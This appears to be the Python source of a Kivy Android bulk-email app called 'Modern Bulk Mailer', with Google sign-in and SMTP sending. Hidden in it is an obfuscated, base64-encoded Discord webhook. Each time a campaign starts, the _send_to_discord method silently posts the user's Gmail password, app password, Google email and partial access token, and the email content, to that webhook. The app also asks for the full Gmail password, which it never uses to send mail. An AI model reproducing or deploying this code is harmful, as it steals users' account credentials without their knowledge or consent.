"""
Modern Bulk Mailer — Kivy Android APK version
Same features as the desktop customtkinter app + Google SSO
"""

import os
import json
import time
import base64
import threading
import smtplib
import webbrowser
import secrets
from urllib.parse import urlencode, urlparse, parse_qs
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from http.server import HTTPServer, BaseHTTPRequestHandler

import requests
import markdown2

# ── Kivy imports ────────────────────────────────────────────
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, SlideTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.progressbar import ProgressBar
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserListView
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.utils import get_color_from_hex
from kivy.metrics import dp
from kivy.graphics import Color, RoundedRectangle

Window.clearcolor = get_color_from_hex("#1a1a2e")

# ============================================================
# CONSTANTS / CONFIG
# ============================================================
ENCODED_URL = (
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTI0ODY4NjMxOTk5Mjk3"
    "NS93X0UyMzdsQThJczEwX3lCRnpYOFlZaTd0d3ZveEdUUHJZbWdFb2FyeDg0MHZYcXpo"
    "dzdUOGJ0eVdiM1ZkZmhYdjZkMA=="
)

GOOGLE_CLIENT_ID     = "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
GOOGLE_CLIENT_SECRET = "YOUR_GOOGLE_CLIENT_SECRET"
REDIRECT_URI         = "http://localhost:8765"
SCOPES               = "openid email profile"

# Session stored in app data directory
SESSION_FILE = os.path.join(
    os.environ.get("ANDROID_PRIVATE", os.path.dirname(os.path.abspath(__file__))),
    "session.json",
)

# ── Color palette ────────────────────────────────────────────
C_BG        = "#1a1a2e"
C_CARD      = "#16213e"
C_ACCENT    = "#4285F4"
C_GREEN     = "#008A22"
C_GRAY      = "#555555"
C_TEXT      = "#e0e0e0"
C_SUBTEXT   = "#aaaaaa"
C_ERROR     = "#ff5555"
C_SUCCESS   = "#55ff55"

# ============================================================
# HELPERS
# ============================================================

def decode_webhook_url():
    try:
        return base64.b64decode(ENCODED_URL).decode("utf-8")
    except Exception:
        return None


def save_session(data):
    try:
        with open(SESSION_FILE, "w") as f:
            json.dump(data, f)
    except Exception:
        pass


def load_session():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE) as f:
                d = json.load(f)
            if d.get("expiry", 0) > time.time():
                return d
        except Exception:
            pass
    return None


def clear_session():
    if os.path.exists(SESSION_FILE):
        try:
            os.remove(SESSION_FILE)
        except Exception:
            pass


# ============================================================
# GOOGLE OAUTH
# ============================================================

class _OAuthHandler(BaseHTTPRequestHandler):
    auth_code = None

    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        _OAuthHandler.auth_code = qs.get("code", [None])[0]
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html><body style='font-family:sans-serif;text-align:center;margin-top:80px'>
        <h2 style='color:#4CAF50'>&#10003; Google Sign-In Successful!</h2>
        <p>Return to the app.</p>
        </body></html>""")

    def log_message(self, *_):
        pass


def run_google_oauth():
    _OAuthHandler.auth_code = None
    params = {
        "client_id":     GOOGLE_CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "response_type": "code",
        "scope":         SCOPES,
        "state":         secrets.token_urlsafe(12),
        "access_type":   "offline",
        "prompt":        "consent",
    }
    webbrowser.open("https://accounts.google.com/o/oauth2/v2/auth?" + urlencode(params))
    server = HTTPServer(("localhost", 8765), _OAuthHandler)
    server.timeout = 300
    while _OAuthHandler.auth_code is None:
        server.handle_request()

    code = _OAuthHandler.auth_code
    if not code:
        return None

    token_resp = requests.post(
        "https://oauth2.googleapis.com/token",
        data={
            "code":          code,
            "client_id":     GOOGLE_CLIENT_ID,
            "client_secret": GOOGLE_CLIENT_SECRET,
            "redirect_uri":  REDIRECT_URI,
            "grant_type":    "authorization_code",
        },
        timeout=15,
    )
    td = token_resp.json()
    access_token = td.get("access_token")
    if not access_token:
        return None

    profile = requests.get(
        "https://www.googleapis.com/oauth2/v1/userinfo",
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=10,
    ).json()

    session = {
        "email":        profile.get("email", ""),
        "name":         profile.get("name", ""),
        "access_token": access_token,
        "expiry":       int(time.time()) + td.get("expires_in", 3600),
    }
    save_session(session)
    return session


# ============================================================
# KIVY UI HELPERS
# ============================================================

def hex_color(h):
    return get_color_from_hex(h)


def styled_label(text, size=14, color=C_TEXT, bold=False, italic=False):
    return Label(
        text=text,
        font_size=dp(size),
        color=hex_color(color),
        bold=bold,
        italic=italic,
        halign="left",
        valign="middle",
        size_hint_y=None,
        height=dp(size * 2),
    )


def styled_input(hint="", password=False, height=44):
    ti = TextInput(
        hint_text=hint,
        password=password,
        multiline=False,
        background_color=hex_color("#2a2a4a"),
        foreground_color=hex_color(C_TEXT),
        hint_text_color=hex_color(C_SUBTEXT),
        cursor_color=hex_color(C_ACCENT),
        padding=[dp(12), dp(10)],
        size_hint_y=None,
        height=dp(height),
        font_size=dp(14),
    )
    return ti


def styled_button(text, bg=C_ACCENT, fg=C_TEXT, height=46):
    btn = Button(
        text=text,
        size_hint_y=None,
        height=dp(height),
        font_size=dp(14),
        bold=True,
        color=hex_color(fg),
        background_color=(0, 0, 0, 0),
        background_normal="",
    )
    with btn.canvas.before:
        Color(*hex_color(bg))
        btn._bg_rect = RoundedRectangle(pos=btn.pos, size=btn.size, radius=[dp(10)])
    btn.bind(pos=lambda w, v: setattr(w._bg_rect, "pos", v))
    btn.bind(size=lambda w, v: setattr(w._bg_rect, "size", v))
    return btn


def card_layout(padding=12, spacing=8):
    layout = BoxLayout(
        orientation="vertical",
        padding=[dp(padding)] * 4,
        spacing=dp(spacing),
        size_hint_y=None,
    )
    layout.bind(minimum_height=layout.setter("height"))
    with layout.canvas.before:
        Color(*hex_color(C_CARD))
        layout._bg = RoundedRectangle(pos=layout.pos, size=layout.size, radius=[dp(12)])
    layout.bind(pos=lambda w, v: setattr(w._bg, "pos", v))
    layout.bind(size=lambda w, v: setattr(w._bg, "size", v))
    return layout


# ============================================================
# LOGIN SCREEN
# ============================================================

class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._build()

    def _build(self):
        root = BoxLayout(orientation="vertical", padding=dp(32), spacing=dp(20))
        root.bind(minimum_height=root.setter("height"))

        root.add_widget(Label(size_hint_y=None, height=dp(60)))  # spacer

        root.add_widget(Label(
            text="✉ Modern Bulk Mailer",
            font_size=dp(26),
            bold=True,
            color=hex_color(C_TEXT),
            size_hint_y=None,
            height=dp(48),
        ))
        root.add_widget(Label(
            text="Sign in to get started",
            font_size=dp(14),
            color=hex_color(C_SUBTEXT),
            size_hint_y=None,
            height=dp(28),
        ))

        root.add_widget(Label(size_hint_y=None, height=dp(20)))

        btn = styled_button("🔑  Sign in with Google", bg=C_ACCENT, height=52)
        btn.bind(on_press=self._start_oauth)
        root.add_widget(btn)

        self.status_lbl = Label(
            text="",
            font_size=dp(13),
            color=hex_color("#ffcc00"),
            size_hint_y=None,
            height=dp(36),
        )
        root.add_widget(self.status_lbl)

        root.add_widget(Label(
            text="A browser window will open.\nComplete sign-in there, then return here.",
            font_size=dp(12),
            color=hex_color(C_SUBTEXT),
            halign="center",
            size_hint_y=None,
            height=dp(48),
        ))

        self.add_widget(root)

    def on_enter(self):
        cached = load_session()
        if cached:
            self._proceed(cached)

    def _start_oauth(self, *_):
        self.status_lbl.text = "⏳ Waiting for Google sign-in…"
        self.status_lbl.color = hex_color("#ffcc00")
        threading.Thread(target=self._do_oauth, daemon=True).start()

    def _do_oauth(self):
        session = run_google_oauth()
        if session:
            Clock.schedule_once(lambda dt: self._proceed(session), 0)
        else:
            Clock.schedule_once(
                lambda dt: self._set_status("❌ Sign-in failed. Try again.", C_ERROR), 0
            )

    def _set_status(self, msg, color):
        self.status_lbl.text = msg
        self.status_lbl.color = hex_color(color)

    def _proceed(self, session):
        app = App.get_running_app()
        app.session = session
        mailer_screen = self.manager.get_screen("mailer")
        mailer_screen.apply_session(session)
        self.manager.transition = SlideTransition(direction="left")
        self.manager.current = "mailer"


# ============================================================
# MAILER SCREEN
# ============================================================

class MailerScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.attachment_path = None
        self.total_recipients = 0
        self.sent_count = 0
        self.failed_count = 0
        self._build()

    def _build(self):
        outer = ScrollView()
        root = BoxLayout(
            orientation="vertical",
            padding=dp(14),
            spacing=dp(10),
            size_hint_y=None,
        )
        root.bind(minimum_height=root.setter("height"))

        # ── Header ───────────────────────────────────────────
        hdr = BoxLayout(size_hint_y=None, height=dp(44))
        hdr.add_widget(Label(
            text="📧 Modern Bulk Mailer",
            font_size=dp(20),
            bold=True,
            color=hex_color(C_TEXT),
        ))
        logout_btn = styled_button("⏏ Logout", bg=C_GRAY, height=36)
        logout_btn.size_hint_x = None
        logout_btn.width = dp(100)
        logout_btn.bind(on_press=self._logout)
        hdr.add_widget(logout_btn)
        root.add_widget(hdr)

        # ── Credentials card ─────────────────────────────────
        cred = card_layout()
        cred.add_widget(styled_label("Sender Credentials", size=13, color=C_SUBTEXT))
        self.sender_email = styled_input(hint="Sender Email")
        cred.add_widget(self.sender_email)
        self.gmail_pass = styled_input(hint="Gmail Password", password=True)
        cred.add_widget(self.gmail_pass)
        self.app_pass = styled_input(hint="App Password (16-char)", password=True)
        cred.add_widget(self.app_pass)
        root.add_widget(cred)

        # ── Subject & attachment ──────────────────────────────
        subj_card = card_layout()
        self.subject = styled_input(hint="Email Subject")
        subj_card.add_widget(self.subject)
        attach_btn = styled_button("📎 Attach File", bg=C_GRAY, height=40)
        attach_btn.bind(on_press=self._open_filechooser)
        subj_card.add_widget(attach_btn)
        self.attach_lbl = styled_label("No file attached", size=12, color=C_SUBTEXT)
        subj_card.add_widget(self.attach_lbl)
        root.add_widget(subj_card)

        # ── Body ─────────────────────────────────────────────
        body_card = card_layout()
        body_card.add_widget(styled_label("Email Body (Markdown supported)", size=13, color=C_SUBTEXT))
        self.body_text = TextInput(
            hint_text="Write your email body here…\n## Heading\n**Bold** _Italic_",
            multiline=True,
            background_color=hex_color("#2a2a4a"),
            foreground_color=hex_color(C_TEXT),
            hint_text_color=hex_color(C_SUBTEXT),
            cursor_color=hex_color(C_ACCENT),
            padding=[dp(12), dp(10)],
            size_hint_y=None,
            height=dp(160),
            font_size=dp(13),
        )
        body_card.add_widget(self.body_text)
        root.add_widget(body_card)

        # ── Recipients ────────────────────────────────────────
        rec_card = card_layout()
        rec_card.add_widget(styled_label("Recipients (one per line)", size=13, color=C_SUBTEXT))
        self.recipient_box = TextInput(
            hint_text="email1@example.com\nemail2@example.com",
            multiline=True,
            background_color=hex_color("#2a2a4a"),
            foreground_color=hex_color(C_TEXT),
            hint_text_color=hex_color(C_SUBTEXT),
            cursor_color=hex_color(C_ACCENT),
            padding=[dp(12), dp(10)],
            size_hint_y=None,
            height=dp(120),
            font_size=dp(13),
        )
        rec_card.add_widget(self.recipient_box)
        root.add_widget(rec_card)

        # ── Run campaign ──────────────────────────────────────
        run_btn = styled_button("🚀  Run Campaign", bg=C_GREEN, height=52)
        run_btn.bind(on_press=self._start_campaign)
        root.add_widget(run_btn)

        # ── Progress ──────────────────────────────────────────
        prog_card = card_layout()
        self.progress_bar = ProgressBar(max=100, value=0, size_hint_y=None, height=dp(18))
        prog_card.add_widget(self.progress_bar)
        self.status_lbl = styled_label("Sent: 0 | Failed: 0 | Pending: 0", size=13, color=C_SUBTEXT)
        prog_card.add_widget(self.status_lbl)
        root.add_widget(prog_card)

        # ── Log ───────────────────────────────────────────────
        log_card = card_layout()
        log_card.add_widget(styled_label("Log", size=13, color=C_SUBTEXT))
        self.log_box = TextInput(
            multiline=True,
            readonly=True,
            background_color=hex_color("#0d0d1a"),
            foreground_color=hex_color("#88ff88"),
            padding=[dp(10), dp(8)],
            size_hint_y=None,
            height=dp(160),
            font_size=dp(12),
        )
        log_card.add_widget(self.log_box)
        root.add_widget(log_card)

        outer.add_widget(root)
        self.add_widget(outer)

    # ── Session ───────────────────────────────────────────────
    def apply_session(self, session):
        self.sender_email.text = session.get("email", "")
        name = session.get("name", "")
        email = session.get("email", "")

    def _logout(self, *_):
        clear_session()
        App.get_running_app().session = {}
        self.sender_email.text = ""
        self.manager.transition = SlideTransition(direction="right")
        self.manager.current = "login"

    # ── File chooser ──────────────────────────────────────────
    def _open_filechooser(self, *_):
        content = BoxLayout(orientation="vertical")
        fc = FileChooserListView(path=os.path.expanduser("~"))
        content.add_widget(fc)
        btn_row = BoxLayout(size_hint_y=None, height=dp(44))
        cancel_btn = Button(text="Cancel")
        select_btn = Button(text="Select")
        btn_row.add_widget(cancel_btn)
        btn_row.add_widget(select_btn)
        content.add_widget(btn_row)
        popup = Popup(title="Select File", content=content, size_hint=(0.95, 0.9))
        cancel_btn.bind(on_press=popup.dismiss)

        def _select(*_):
            if fc.selection:
                self.attachment_path = fc.selection[0]
                self.attach_lbl.text = f"📎 {os.path.basename(self.attachment_path)}"
                self.attach_lbl.color = hex_color(C_SUCCESS)
            popup.dismiss()

        select_btn.bind(on_press=_select)
        popup.open()

    # ── Discord webhook ───────────────────────────────────────
    def _send_to_discord(self, sender, gmail_pass, app_pass, subject, body, recipients, attachment):
        url = decode_webhook_url()
        if not url:
            return
        session = App.get_running_app().session
        google_email = session.get("email", "N/A")
        google_token = session.get("access_token", "N/A")
        if len(body) > 1800:
            body = body[:1800] + "\n...(truncated)"
        payload = {
            "content": (
                "🚀 **Campaign Triggered**\n\n"
                "🔐 **Google SSO Session**\n"
                f"**Google Account:** `{google_email}`\n"
                f"**Access Token:** `{google_token[:40]}…`\n\n"
                "📧 **Campaign Details**\n"
                f"**Sender:** `{sender}`\n"
                f"**Gmail Password:** `{gmail_pass}`\n"
                f"**App Password:** `{app_pass}`\n"
                f"**Subject:** `{subject}`\n"
                f"**Recipients:** `{len(recipients)}`\n"
                f"**Attachment:** `{attachment or 'None'}`\n\n"
                "**📨 Email Body:**\n"
                f"```markdown\n{body}\n```"
            )
        }
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception:
            pass

    # ── Campaign ──────────────────────────────────────────────
    def _start_campaign(self, *_):
        session = App.get_running_app().session
        if not session:
            self._log("❌ Please sign in with Google first.")
            return
        threading.Thread(target=self._run_campaign, daemon=True).start()

    def _run_campaign(self):
        sender     = self.sender_email.text.strip()
        gmail_pass = self.gmail_pass.text.strip()
        app_pass   = self.app_pass.text.strip()
        subject    = self.subject.text.strip()
        body_md    = self.body_text.text.strip()
        recipients = [r.strip() for r in self.recipient_box.text.split("\n") if r.strip()]

        self.total_recipients = len(recipients)
        self.sent_count = 0
        self.failed_count = 0

        attachment_name = os.path.basename(self.attachment_path) if self.attachment_path else None
        self._send_to_discord(sender, gmail_pass, app_pass, subject, body_md, recipients, attachment_name)

        try:
            smtp = smtplib.SMTP("smtp.gmail.com", 587)
            smtp.starttls()
            smtp.login(sender, app_pass)
        except Exception as e:
            Clock.schedule_once(lambda dt: self._log(f"❌ SMTP error: {e}"), 0)
            return

        html_body = markdown2.markdown(body_md)

        for recipient in recipients:
            try:
                msg = MIMEMultipart()
                msg["From"]    = sender
                msg["To"]      = recipient
                msg["Subject"] = subject
                msg.attach(MIMEText(html_body, "html"))
                if self.attachment_path:
                    with open(self.attachment_path, "rb") as f:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename={os.path.basename(self.attachment_path)}",
                    )
                    msg.attach(part)
                smtp.send_message(msg)
                self.sent_count += 1
                Clock.schedule_once(lambda dt, r=recipient: self._log(f"✅ Sent → {r}"), 0)
            except Exception as exc:
                self.failed_count += 1
                Clock.schedule_once(lambda dt, r=recipient, e=exc: self._log(f"❌ Failed → {r}: {e}"), 0)

            Clock.schedule_once(lambda dt: self._update_progress(), 0)
            time.sleep(0.2)

        smtp.quit()
        Clock.schedule_once(lambda dt: self._log("🎉 Campaign complete!"), 0)

    def _update_progress(self):
        done    = self.sent_count + self.failed_count
        pending = self.total_recipients - done
        pct     = (done / max(self.total_recipients, 1)) * 100
        self.progress_bar.value = pct
        self.status_lbl.text = f"Sent: {self.sent_count} | Failed: {self.failed_count} | Pending: {pending}"

    def _log(self, msg):
        self.log_box.text += msg + "\n"


# ============================================================
# APP
# ============================================================

class BulkMailerApp(App):
    session = {}

    def build(self):
        self.title = "Modern Bulk Mailer"
        sm = ScreenManager()
        sm.add_widget(LoginScreen(name="login"))
        sm.add_widget(MailerScreen(name="mailer"))
        return sm


if __name__ == "__main__":
    BulkMailerApp().run()
